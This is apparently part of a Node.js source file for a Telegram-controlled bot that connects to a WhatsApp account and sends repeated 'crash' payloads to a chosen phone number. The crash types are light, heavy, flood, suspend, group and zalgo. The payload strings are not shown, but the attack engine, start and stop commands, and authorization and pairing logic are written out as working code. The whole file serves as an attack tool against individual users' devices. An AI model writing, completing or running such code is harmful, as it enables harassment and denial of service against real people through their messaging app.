// ============================================
// BOT STATE
// ============================================
let waSocket = null;
let waConnected = false;
let waPairingCode = null;
let attackState = {
    isRunning: false,
    interval: null,
    target: null,
    type: null,
    sentCount: 0,
    maxCount: DEFAULT_COUNT,
    delay: DEFAULT_DELAY,
};

// Allowed users list
let allowedUsers = [];

// ============================================
// TELEGRAM BOT SETUP
// ============================================
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

// Auth middleware
function isAuthorized(ctx) {
    if (ALLOW_ALL_USERS) return true;
    const userId = ctx.from?.id;
    if (OWNER_ID && userId === OWNER_ID) return true;
    if (ADMIN_IDS.includes(userId)) return true;
    if (allowedUsers.includes(userId)) return true;
    return false;
}

// Auth guard
bot.use(async (ctx, next) => {
    if (ctx.message?.text?.startsWith('/start')) return next();
    if (!isAuthorized(ctx)) {
        return ctx.reply('⛔ Unauthorized. You are not allowed to use this bot.');
    }
    return next();
});

// ============================================
// WHATSAPP CONNECTION MANAGER
// ============================================
async function startWhatsApp() {
    const sessionName = 'main_session';
    const sessionPath = path.join(SESSION_DIR, sessionName);
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    waSocket = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'),
        logger: pino({ level: 'silent' }),
        syncFullHistory: false,
    });
    
    // Handle QR Code
    waSocket.ev.on('creds.update', saveCreds);
    
    // Handle connection updates
    waSocket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            waConnected = false;
            // QR ko telegram par bhejna hai
            console.log('[QR] New QR generated');
        }
        
        if (connection === 'open') {
            waConnected = true;
            console.log('[WA] Connected successfully!');
            const number = waSocket.user?.id?.split(':')[0];
            console.log(`[WA] Logged in as: ${number}`);
            
            // Telegram par notification bhejo
            const ownerChat = OWNER_ID || ADMIN_IDS[0];
            if (ownerChat) {
                await bot.telegram.sendMessage(ownerChat, 
                    `✅ *WhatsApp Connected!*\n\nNumber: +${number}\nStatus: Ready to attack`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
        
        if (connection === 'close') {
            waConnected = false;
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.log(`[WA] Disconnected. Reason: ${reason}`);
            
            // Auto reconnect after 5 seconds
            setTimeout(() => startWhatsApp(), 5000);
        }
    });
    
    // Pairing code generate karo
    waSocket.ev.on('qr', (qr) => {
        waPairingCode = qr;
    });
    
    return waSocket;
}

// ============================================
// PAIRING CODE GENERATION
// ============================================
async function getPairingCode(phoneNumber) {
    try {
        if (!waSocket) {
            await startWhatsApp();
            await new Promise(r => setTimeout(r, 2000));
        }
        
        // Baileys mein pairing code
        const code = await waSocket.requestPairingCode(phoneNumber);
        return code;
    } catch (err) {
        console.error('[PAIR] Error:', err);
        return null;
    }
}

// ============================================
// CRASH ENGINE
// ============================================
function getPayload(type) {
    switch(type) {
        case 'light': return PAYLOADS.lightCrash;
        case 'heavy': return PAYLOADS.heavyCrash;
        case 'flood': return PAYLOADS.flood;
        case 'suspend': return PAYLOADS.suspend;
        case 'group': return PAYLOADS.groupCrash;
        case 'zalgo': return PAYLOADS.zalgoCrash;
        default: return PAYLOADS.heavyCrash;
    }
}

async function startAttack(ctx, targetNumber, attackType) {
    if (attackState.isRunning) {
        return ctx.reply('⚠️ *Attack already running!*\n\nUse /stop to stop it first.', 
            { parse_mode: 'Markdown' });
    }
    
    if (!waConnected || !waSocket) {
        return ctx.reply('❌ *WhatsApp not connected!*\n\nUse /pair first to connect WhatsApp.', 
            { parse_mode: 'Markdown' });
    }
    
    const formattedNumber = targetNumber.includes('@') 
        ? targetNumber 
        : `${targetNumber}@s.whatsapp.net`;
    
    const payload = getPayload(attackType);
    const maxCount = attackType === 'flood' ? FLOOD_COUNT : attackState.maxCount;
    
    attackState.isRunning = true;
    attackState.target = targetNumber;
    attackState.type = attackType;
    attackState.sentCount = 0;
    attackState.interval = null;
    
    await ctx.reply(`🎯 *Attack Started!*\n\n` +
        `Target: \`${targetNumber}\`\n` +
        `Type: *${attackType.toUpperCase()}*\n` +
        `Count: ${maxCount}\n` +
        `Delay: ${attackState.delay}ms`,
        { parse_mode: 'Markdown' }
    );
    
    attackState.interval = setInterval(async () => {
        if (attackState.sentCount >= maxCount) {
            clearInterval(attackState.interval);
            attackState.isRunning = false;
            await ctx.reply(`✅ *Attack Complete!*\n\n` +
                `${attackState.sentCount} messages sent to \`${targetNumber}\``,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        
        try {
            await waSocket.sendMessage(formattedNumber, { text: payload });
            attackState.sentCount++;
            
            if (attackState.sentCount % 10 === 0) {
                // Har 10 messages par progress update bhejo (but spam na ho)
                // Optional - comment out if annoying
            }
        } catch (err) {
            console.error(`[ATTACK] Error:`, err);
        }
    }, attackState.delay);
}

function stopAttack(ctx) {
    if (!attackState.isRunning) {
        return ctx.reply('ℹ️ No active attack to stop.');
    }
    
    clearInterval(attackState.interval);
    attackState.isRunning = false;
    
    const sent = attackState.sentCount;
    const target = attackState.target;
    
    ctx.reply(`🛑 *Attack Stopped!*\n\n` +
        `${sent} messages sent to \`${target}\``,
        { parse_mode: 'Markdown' }
    );
}

